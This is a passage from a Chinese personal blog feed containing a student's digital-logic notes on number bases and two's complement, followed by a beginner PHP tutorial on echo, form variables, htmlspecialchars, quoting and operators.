href="#二进制转十六进制"></a> 二进制转十六进制</h3><p>同上，每4位分一组，不够4位补零。<strong>“4对1”</strong></p><h3 id="十六进制转二进制"><a class="markdownIt-Anchor" href="#十六进制转二进制"></a> 十六进制转二进制</h3><p>同上，每一位十六进制数转4位二进制数。<strong>“1对4”</strong></p><h3 id="十进制转二进制"><a class="markdownIt-Anchor" href="#十进制转二进制"></a> 十进制转二进制</h3><p>将整数部分和小数部分分别进行转换，转换后合并。</p><p>整数部分<strong>除以二取余</strong>；后得到的部分为高位。</p><p>小数部分<strong>乘以二取整</strong>；先得到的部分为高位。小数部分在不能精确转换的情况下，可以根据精度要求进行若干次乘以2的运算后结束转换。</p><h3 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h3><ol><li>N进制转换为十进制：权值相加法</li><li>十进制转化为N进制：求余法；转二进制时直接辗转相除取余数，转8、16进制时常常先转二进制后再转其他进制方便计算。</li><li>N（2、8、16）进制之间的转换，每三位或者四位放在一起，借助十进制的权值相加法计算</li></ol><h2 id="二进制的算术运算"><a class="markdownIt-Anchor" href="#二进制的算术运算"></a> 二进制的算术运算</h2><p>二进制的算术运算中的加减乘除都可以由移位和相加两种操作来完成，这使得电路结构得到大大简化。</p><ul><li>加法计算 逢二进一</li><li>减法计算 借一当二</li><li>乘法运算 乘数左移、相加</li><li>除法运算 除数右移、相减</li></ul><h2 id="原码-反码和补码"><a class="markdownIt-Anchor" href="#原码-反码和补码"></a> 原码、反码和补码</h2><p>二进制数的正负号也是用0、1来表示：正数为0，负数为1。</p><p>当我们按照这个规则时，(1)<sub>B</sub>=0001，(-1)<sub>B</sub>=1001，但是它们二进制相加时明显不为0，因为它们采用的是<strong>混合编码</strong>。</p><p>因此我们需要采用<strong>补码</strong>，即将这个数的二进制取反再加1。</p><p>此时(1)<sub>B</sub>的补码定义为(-1)<sub>B</sub>=1110+0001=1111。易知此时二进制相加为0。</p><p>而<strong>反码</strong>即简单的将二进制数各位取反。</p><ol><li>原码：由符号位和数值位组成，正数符号位为0，负数符号位为1.</li><li>补码：正数的补码<mark>原码；负数的补码</mark>反码+1</li><li>补码算原码：减1求反码；求补码的补码。</li></ol><p><strong>注意</strong>：负数的补码取反时仅取数值位反码，符号位不变。</p><h2 id="利用补码实现减法运算"><a class="markdownIt-Anchor" href="#利用补码实现减法运算"></a> 利用补码实现减法运算</h2><p>减去某个数可以用加上他的补码来代替。</p><p>结果的符号等于两个加数的符号位和来自最高有效数字为的进位三者相加的结果。</p><p><strong>注意</strong>：使用二进制补码进行加减运算时得到的结果仍为补码，如果结果为正数可以不作处理，如果结果为负数记得取补码的补码得到负数的原码。</p><p>另外，将两数写成补码时，数值部分所取位数必须足以表示和的最大值，否则计算结果会出现溢出错误。</p><p><strong>BCD码（Binary Code Decimal）</strong></p><p><strong>格雷码</strong></p><p><strong>ASCII码</strong></p><h2 id="小结-2"><a class="markdownIt-Anchor" href="#小结-2"></a> 小结</h2><p>本节笔记主要摘录了数字逻辑的概论部分，内容较简单。然后介绍了进制基础和二进制的一些基本运算规则，需要重点掌握。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/2b4ac66703d6f4f4f42296696389284f.jpg" alt="2b4ac66703d6f4f4f42296696389284f" /></p>]]></content>
      
      
      <categories>
          
          <category> 课堂随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数字逻辑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP碎碎念（一）——开始入门！</title>
      <link href="/posts/46809cdafd4d/"/>
      <url>/posts/46809cdafd4d/</url>
      
        <content type="html"><![CDATA[<p>依旧是无可救药的一天……在开始正文之前请容我小小的吐槽一下。</p><p>CTF吧，真的是个巨坑。</p><p>一开始选的web和misc，结果选这个方向的人太多找不到其他方向的人组队……形势所迫，只好自己看看能不能全栈或者换个方向下手。一开始想试试pwn，结果pwn要求有逆向基础，又想去试试逆向，结果逆向又要求有汇编语言基础，好巧不巧的是汇编语言的书籍刚好给人借走了……好了，毫无疑问这也是个坑，不过汇编早晚都得学，倒也不是什么大问题。但是现在又只能暂时转向web了，无奈，先从之前的SQL注入入手吧。但是没有MySQL基础去学注入实在是看天书，那去学学MySQL？巧了，MySQL要求PHP基础，PHP又要求HTML/CSS基础（所幸上学期已经学过前端三件套了），于是乎，又得先从PHP开始学起，还有一大堆协议等着，又是个巨坑……</p><p>实在是……受不了一点</p><p>好了，闲话到此打住，先来归纳一下今天学习PHP的一些笔记吧，姑且当做我的碎碎念好了。</p><p>那么，正文开始。</p><hr /><p>我参考的书是《PHP和MySQL Web开发》，同时参考了部分菜鸟驿站的内容<a href="https://www.runoob.com/php/php-tutorial.html">PHP 教程 | 菜鸟教程 (runoob.com)</a>。有兴趣的可以自行查看，适合快速预习。</p><h2 id="开始之前"><a class="markdownIt-Anchor" href="#开始之前"></a> 开始之前</h2><p>首先我们先对PHP做一个大概的综述，方便更好的理解这门语言。</p><p>在开发一个网站时，一般都是先用HTML搭建起一个大致的框架，然后用CSS美化网页属性，最后用JavaScript实现一些更复杂的用户交互功能。但是，学会这些基本上只能搭建一个<strong>静态网页</strong>，也就是说，用户不能与网站产生任何互动（也许JS除外？），每一次网页的更新都必须依靠与重写其底层的HTML代码。那么我们要如何搭建起一个<strong>动态页面</strong>来实现更加丰富的网页功能呢？答案是使用PHP。</p><p>PHP是一个服务器端脚本代码，它能接收网页传递给服务器的数据，并在后端处理数据并将其发送到网页来实现内容的更新。最经典的操作就是处理表单，比如，处理一个在线购物的购物车订单。</p><p>PHP的学习其实并不难（至少书上是这么说的），如果你有过C/C++、Python等其他编程语言基础，要上手PHP其实挺快的。PHP存在大量的函数和语句功能和C相同，基本上就是一通百通的道理（果然C是万物之母）。这里主要介绍一些PHP语言特有的属性，和C雷同的地方就略过了，也就是说，阅读这篇文章已经默认了你已经有了一定的C语言基础，不过要求也没那么高，只要掌握一些最基本的C语法就可以上手。</p><p>那么介绍到此为止，我们开始讲解PHP的语法。</p><h2 id="万物源头之hello-world"><a class="markdownIt-Anchor" href="#万物源头之hello-world"></a> 万物源头之hello world</h2><p>这里在书中给出了一个HTML制作的静态订单网站搭配PHP进行讲解，但是很遗憾我没有这本书的电子书资源，而且我也不想手撸一个HTML网页，所以这里我选择介绍菜鸟教程的内容。</p><p>在编程中，每每开始学习一门新语言，先输出一个hello world是传统，比如C的<code>printf(&quot;Hello, world&quot;);</code>。那么，在PHP中我们要怎么发扬传统呢？下面是我们编写的第一个PHP语句。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello, world&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里就有许多需要讲解的地方了。</p><h3 id="php语句的格式"><a class="markdownIt-Anchor" href="#php语句的格式"></a> PHP语句的格式</h3><p>如你所见，在执行输出函数的主体外，套着一个&lt; ?php … ?&gt;，以小于号开始，以大于号结束。这是PHP代码块的标志，即使是在PHP文件中，在标志外的代码仍然会被识别为HTML，只有代码块内的PHP语言才能被正确解释。所以，所有的PHP语句都必须在标志内编写。</p><p>值得一提的是这种风格有它自己的名字，叫做XML风格，是最为推荐也是最通用的风格。简短风格则是可以省开头的‘php’，但是不推荐。</p><h3 id="echo是什么"><a class="markdownIt-Anchor" href="#echo是什么"></a> echo是什么？</h3><p>在PHP中一般使用echo来回显内容，使用方法如上。在echo后接你想要回显的值，如果是字符串需要加上双引号，且末尾用分号表示语句结束（这一点很像C语言）。</p><p>当然用print也能实现同样的功能，区别在于echo无返回值且速度更快，而print会返回1且不支持输出多条语句。在使用echo和print时，可以加括号也可以不加括号，因为echo和print都不是真正的函数。</p><h3 id="关于空格"><a class="markdownIt-Anchor" href="#关于空格"></a> 关于空格</h3><p>可以看到，echo前自动加上了一段缩进。</p><p>但是需要声明的是，不同于Python，PHP和HTML一样对空格和缩进不敏感。也就是说，PHP解释器会自动删掉语句间的空格和缩进，这些对语句的执行没有影响。但我们还是推荐在编程时使用缩进和空格，因为这可以提高代码可读性。</p><h3 id="关于注释"><a class="markdownIt-Anchor" href="#关于注释"></a> 关于注释</h3><p>PHP的注释有几种形式，基本是C和Python的大糅合。你可以使用<code>//</code>或者<code>/**/</code>来进行注释，也可以使用Python风格的<code>#</code>来注释，这些注释都不会被执行。</p><h2 id="来添加一个动态内容吧"><a class="markdownIt-Anchor" href="#来添加一个动态内容吧"></a> 来添加一个动态内容吧</h2><p>上面我们用PHP实现了计算机界的祖传手艺，但这还是静态的啊，和我们一开始说好的不一样啊。所以我们现在尝试用PHP实现一个动态内容，我们将调用date()函数，来显示当前的时间。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;The time is&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">date</span>(<span class="string">&#x27;H:i, jS F Y&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">以下代码是等价的</span></span><br><span class="line"><span class="comment">&lt;?php</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;p&gt;The time is&quot;.date(&#x27;H:i, jS F Y&#x27;).&quot;&lt;/p&gt;&quot;;</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>小朋友，你是否有很多问号？别急，让我们来逐步探索它背后的真相。</p><h3 id="date函数"><a class="markdownIt-Anchor" href="#date函数"></a> date()函数？！</h3><p>在这个代码中，我们是这样调用date()函数的<code>date('H:i, jS F Y')</code>。很明显，我们向函数传递了一个格式化字符串变量。这个变量中，H代表小时，i是分钟，j代表该月的日期，s表示顺序后缀（在这里也就是‘th’），F代表月份，Y则是年份。</p><p>如果你发现运行代码给出的时间与现在不一致，大概率是你没有调整时区，如何设置时区，请自行上网询问度娘。</p><h3 id="为什么等价"><a class="markdownIt-Anchor" href="#为什么等价"></a> 为什么等价？</h3><p>在PHP中，（.）是连接操作符，通过使用 . ，我们可以连接起不同的语句和变量，将他们一起输出。</p><h3 id="怎么还有奇怪的p"><a class="markdownIt-Anchor" href="#怎么还有奇怪的p"></a> 怎么还有奇怪的&lt;p&gt;?</h3><p>学过HTML的小朋友都知道，这个是段落的标志。没错，PHP会自动渲染HTML语言并把它显示在网页上，配合的相当不错。</p><h2 id="如何访问表单变量"><a class="markdownIt-Anchor" href="#如何访问表单变量"></a> 如何访问表单变量</h2><p>好了，前面我们提到PHP最常用来做的事就是实现订单，那么我们要如何操作呢？</p><p>为了详细解释这个知识点，我不得不花了两分钟去网上找到了这本书的电子版资源……（太痛苦了），然后把表单的HTML代码粘贴如下。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="comment">&lt;!--总之注意body部分--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;processorder.php&quot;</span><span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span><span class="comment">&lt;!--注意action的取值指向了一个php文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">bgcolor</span>=<span class="string">&quot;#cccccc&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">&quot;150&quot;</span>&gt;</span>Item<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">&quot;15&quot;</span>&gt;</span>Quantity<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>Tires<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span><span class="attr">name</span>=<span class="string">&quot;tireqty&quot;</span><span class="attr">size</span>=<span class="string">&quot;3&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">maxlength</span>=<span class="string">&quot;3&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!--注意这个文本框的名字！！--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>Oil<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span><span class="attr">name</span>=<span class="string">&quot;oilqty&quot;</span><span class="attr">size</span>=<span class="string">&quot;3&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">maxlength</span>=<span class="string">&quot;3&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!--注意这个文本框的名字！！--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>Spark Plugs<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span><span class="attr">name</span>=<span class="string">&quot;sparkqty&quot;</span><span class="attr">size</span>=<span class="string">&quot;3&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">maxlength</span>=<span class="string">&quot;3&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!--注意这个文本框的名字！！--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span><span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span><span class="attr">value</span>=<span class="string">&quot;Submit Order&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后我们得到了一个小小的可爱的订单。</p><p><img src="https://cdn.jsdelivr.net/gh/Adam8en/blogImage/images/20230922001812.png" alt="" /></p><center>很可爱吧</center><p>显然，这个表单的目的是接收用户输入的值，然后将其提交给processorder.php文件（也就是表单的action属性指向的那个）。那么，我们要如何用PHP文件处理接受的值呢？</p><p>闲话少说，上代码！</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$tireqty</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;tireqty&#x27;</span>];</span><br><span class="line">    <span class="variable">$oilqty</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;oilqty&#x27;</span>];</span><br><span class="line">    <span class="variable">$sparkqty</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;sparkqty&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>打住，这里又出现了新情况，让我们细细道来。</p><h3 id="关于奇怪的"><a class="markdownIt-Anchor" href="#关于奇怪的"></a> 关于奇怪的$</h3><p>在PHP中，我们一般要在声明的变量前加$，不仅如此，在使用变量时也必须要加上$来告诉服务器这是个变量而非什么奇奇怪怪的东西。除此之外，还需要强调的一点是，PHP是一门弱类型语言，即不需要专门指定变量的类型而交给服务器自动匹配，与之相反的则是C语言的强类型。</p><p>关于声明变量，需要注意的是PHP区分变量大小写（但不区分函数的大小写），且变量名只能以下划线和字母开头，由下划线、字母和数字组成。</p><p>PHP有以下数据类型：</p><ul><li>String 字符串</li><li>Integer 整数</li><li>Float 浮点数</li><li>Boolean 布尔值</li><li>Array 数组</li><li>Object 对象</li><li>NULL 空</li><li>Resource 资源（一种特殊变量，保存了到外部资源的一个引用，比如MySQL）</li></ul><h3 id="关于奇怪的_post"><a class="markdownIt-Anchor" href="#关于奇怪的_post"></a> 关于奇怪的_POST</h3><p>我们注意到有<code>$_POST['tireqty']</code>，这东西很厉害，可是要怎么去理解它呢。</p><p>我们最开始的设想是用PHP去处理用户提交的表单信息，且其中一个文本框的名字就叫做’tireqty’。显然，这个代码的作用就是访问’tireqty’文本框的内容。<code>_POST</code>是一个数组，它包含了HTTP通过POST提交的所有数据，也就是文本框的method被设置为POST的情况。除此之外，我们还有<code>_GET</code>与<code>_REQUEST</code>。前者用于处理以GET形式提交的数据，而后者则用来处理POST和GET提交的数据总和。一般情况下，数据都可以通过<code>_REQUEST</code>来获得。</p><p>我们把通过这种方法获得的数组称为<strong>超级全局数组</strong>。</p><p>类似的超级全局数组还有以下几种：</p><ul><li>$GLOBALS，可以访问所有全局变量</li><li>$_SERVER，服务器环境变量数组</li><li>$_COOKIE，cookie变量数组</li><li>$_FILES，文件上传相关的变量数组</li><li>$_REQUEST，所有用户输入的变量数组，包括$_POST、$_GET、$_COOKIE所包含的输入内容（但是不包含$FILES）</li><li>$_ENV，环境变量数组</li></ul><h4 id="题外话get与post"><a class="markdownIt-Anchor" href="#题外话get与post"></a> 题外话：GET与POST</h4><p>网页向服务器提交数据通常有两种方法，一种是将数据直接附加在链接后面发送给服务器，即GET。例如<code>https://adam8en.github.io?id=1</code>就是向网页传递了一个id=1的数据。而POST数据则是将数据单独发出去，具体细节可以用burp suit抓包查看，通常不涉及到复杂的操作时用hackbar就可以很好的使用POST发送数据。</p><h3 id="如何回显收到的数据"><a class="markdownIt-Anchor" href="#如何回显收到的数据"></a> 如何回显收到的数据</h3><p>一般来说，使用我们前文提到的输出hello world的方法就可以回显表单中提交的数据，即：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$tireqty</span>.<span class="string">&#x27;tires&lt;br /&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>但是我们并不推荐这种方式，因为我们没有对用户输入的数据进行检验，这可能会导致恶意用户输入恶意语句而引发安全性问题（终于有点安全的知识了），你应该对数据进行过滤，这里我们先使用另一种方法，即调用<code>htmlspecialchars()</code>函数。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$tireqty</span>).<span class="string">&#x27;tires&lt;br /&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这样做也可以获得可视化结果，且更加安全。如果你现在在浏览器中载入这个脚本，正常来说就可以看到回显的内容。</p><img src="https://cdn.jsdelivr.net/gh/Adam8en/blogImage/images/20230922101925.png" style="zoom:50%;" /><p>然而如果你真的这么做了而且和我一样都是小白，那么你大概率看到的不是正常的结果，而是PHP文件的源代码……</p><p><img src="https://cdn.jsdelivr.net/gh/Adam8en/blogImage/images/20230922102017.png" alt="" /></p><p>因为你没有给自己的主机配置服务器，从而网页不知道该如何去解析PHP代码。至于如何去配置服务器……抱歉，你这个问题我还真不知道lol。</p><h3 id="变量和字面量"><a class="markdownIt-Anchor" href="#变量和字面量"></a> 变量和字面量</h3><p>经历过一些不愉快的小插曲后，我们再次回到例题本身。有关<code>echo htmlspecialchars($tireqty).'tires&lt;br /&gt;';</code>这一行代码本身，关于（.）的字符串连接符我们已经讲过，而后面所跟的单引号却又是另一个重点。</p><p>在PHP中，双引号和单引号存在区别。其实这一点在C语言中也有类似的情况，在C中单引号常量被视为字符常量，哪怕单引号中包含的字符不止一个；而双引号下的常量则被解释为字符串，末尾默认有一个’\0’占位符存在。而在PHP中，使用双引号会被认为是字符串，此时PHP会解析双引号中的变量，而单引号则会被纯粹的当做是一个字面量，换句话说PHP会直接输出变量名而不会对其进行解析。</p><p>例如下面这一串代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$web_url</span>=<span class="string">&#x27;adam8en.github.io&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$web_url</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$web_url&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以预见到的是，用双引号包裹的变量将会echo出变量的值，而下面的单引号变量则只会打印出变量名。</p><p>在日常使用中，单引号的运行速度比双引号更快，因为单引号不需要经过解析步骤。</p><h3 id="声明和使用常量"><a class="markdownIt-Anchor" href="#声明和使用常量"></a> 声明和使用常量</h3><p>上面我们介绍了如何定义和给变量赋值，那么我们要如何定义常量呢？</p><p>在C语言中，我们一般使用<code>#define</code>定义常量。比如：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BIRTHDAY 77</span></span><br></pre></td></tr></table></figure><p>在实际编程中，我们就可以用常量’BIRTHDAY’来代替整数77。</p><p>在PHP中，我们仍然需要使用define去定义常量，但是使用方式有所不同，具体形式如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">define(<span class="string">&#x27;BIRTHDAY&#x27;</span>,<span class="number">77</span>);</span><br></pre></td></tr></table></figure><p>这时我们就定义了一个新常量。</p><p>除了我们自己定义的常量外，PHP还自己定义了许多常量，我们可以用函数phpinfo()来查看。</p><p>注意函数phpinfo()，今后在安全方面我们还会遇到它。</p><h2 id="就到这里"><a class="markdownIt-Anchor" href="#就到这里"></a> 就到这里</h2><p>好了，通过表单这个例子我们阐述了大部分PHP语言不同于C语言的新特性，接下来我会快速介绍一些PHP和C语言类似的语法知识点，并简单的指出他们之间的细微不同（如果有的话），一些我认为不重要的知识点可能会被我略过（比如转换变量类型的函数），现在让我们快起来吧。</p><h3 id="变量作用域"><a class="markdownIt-Anchor" href="#变量作用域"></a> 变量作用域</h3><p>和C语言类似，分为局部作用域、全局作用域、静态作用域、本地作用域，唯一不同的超级全局作用域在前文中已经有过具体介绍。</p><h3 id="使用操作符"><a class="markdownIt-Anchor" href="#使用操作符"></a> 使用操作符</h3><p>PHP也可以直接使用四则运算符合取余符号来对变量进行操作。如果对字符串使用操作符，PHP会尝试把字符串转化为数字。比如把带‘e’或‘E’的字符串视为使用了科学计数法，并将其转化为相应的浮点数。除此之外，PHP还会在字符串开头处寻找数字作为字符串的值，否则把字符串视为0。（C语言会直接报错）</p><h4 id="字符串操作符"><a class="markdownIt-Anchor" href="#字符串操作符"></a> 字符串操作符</h4><p>PHP可以直接实现字符串的加法，通过连接符（.）来实现。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$fname</span>=<span class="string">&quot;Adam&quot;</span>;</span><br><span class="line"><span class="variable">$lname</span>=<span class="string">&quot;Ben&quot;</span>;</span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$fname</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$lname</span>;</span><br><span class="line"><span class="comment">//别问我为什么没有遵循XML风格，好麻烦</span></span><br></pre></td></tr></table></figure><h4 id="递减和递增操作符"><a class="markdownIt-Anchor" href="#递减和递增操作符"></a> 递减和递增操作符</h4><p>PHP允许使用诸如<code>++</code>的形式去递增变量的值，和C相同。</p><h4 id="引用操作符"><a class="markdownIt-Anchor" href="#引用操作符"></a> 引用操作符</h4><p>PHP可以通过“&amp;”来引用变量的值。它的用法和效果类似于C语言的指针，但是它实际上并不是指针，只是一个别名。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$a</span>;<span class="comment">//b等于5，相当于生成了一个a的副本</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">7</span>；<span class="comment">//此时b仍为5</span></span><br><span class="line"><span class="comment">/**********************/</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$b</span>=&amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="number">7</span>;<span class="comment">//此时b也为7</span></span><br></pre></td></tr></table></figure><p>如果想要破坏掉变量之间的引用关系，使用unset()函数重置。</p><h4 id="比较操作符"><a class="markdownIt-Anchor" href="#比较操作符"></a> 比较操作符</h4><p>除了<code>==</code>等于操作符外，PHP还有<code>===</code>恒等操作符。区别在于前者只判断数值是否相等，而后者要求类型也要一致。</p><p>比如0和’0’，在<code>==</code>下是相等的，而<code>===</code>是不等的。因为前者是整数，后者是字符串。</p><h4 id="逻辑操作符"><a class="markdownIt-Anchor" href="#逻辑操作符"></a> 逻辑操作符</h4><p>除了和C相同的<code>&amp;&amp; || !</code>操作符外，PHP还支持类Python的<code>and or</code>逻辑操作符，但是优先级比前面的略低。PHP还支持<code>xor</code>异或操作符。</p><h4 id="位操作符"><a class="markdownIt-Anchor" href="#位操作符"></a> 位操作符</h4><p>这一部分PHP和C完全相同。</p><h4 id="其他操作符"><a class="markdownIt-Anchor" href="#其他操作符"></a> 其他操作符</h4><p>操作符<code>new</code>和<code>-&gt;</code>分别用来初始化类的实例和访问类的成员。看起来有点像C++的分配内存符和C的访问结构指针变量操作符。</p><p>PHP和C都支持三元操作符<code>condition ? value if true : value if false</code>。</p><h3 id="错误抑制符"><a class="markdownIt-Anchor" href="#错误抑制符"></a> 错误抑制符</h3><p>错误抑制符<code>@</code>可以对任何表达式使用，它将抑制可能产生的警告而使程序不中断运行。例如：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=@(<span class="number">50</span>/<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="执行操作符"><a class="markdownIt-Anchor" href="#执行操作符"></a> 执行操作符</h3><p>执行操作符是一对反向双引号``，它的作用是把反双引号中间的内容当成服务器端的命令来执行。比如在windows端：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$out</span>=`dir c:`;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="variable">$out</span>.<span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这串代码会得到一个目录列表保存在out中，然后在浏览器上显示。</p><h3 id="数组操作符"><a class="markdownIt-Anchor" href="#数组操作符"></a> 数组操作符</h3><p>PHP也支持用[]访问数组元素，除此之外还有其他操作符。比如可以用+来连接两个数组。</p><h3 id="类型操作符"><a class="markdownIt-Anchor" href="#类型操作符"></a> 类型操作符</h3><p>PHP只有一个类型操作符instanceof，用于判断一个对象是否是指定的类。</p><h3 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h3><p>剩下的诸如if、while、for、switch1等代码块均与C规则相同，不一一介绍了。唯一注意的地方是除了使用C经典的花括号控制结构外，还可以使用PHP特色的控制方法。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>==<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">//C风格</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;TEST&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*这两种方法是等价的*/</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>==<span 